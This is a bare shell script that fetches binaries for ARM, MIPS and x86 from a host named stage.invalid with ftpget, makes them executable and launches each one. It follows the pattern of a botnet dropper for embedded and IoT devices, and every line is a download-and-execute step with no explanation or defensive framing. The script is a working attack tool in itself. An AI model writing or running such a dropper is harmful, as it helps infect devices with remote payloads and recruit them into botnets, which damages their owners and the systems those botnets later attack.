#!/bin/sh
ftpget stage.invalid image.arm image.arm; cat image.arm > runner; chmod +x *; ./runner launch
ftpget stage.invalid image.mips image.mips; cat image.mips > runner; chmod +x *; ./runner launch
ftpget stage.invalid image.x86 image.x86; cat image.x86 > runner; chmod +x *; ./runner launch
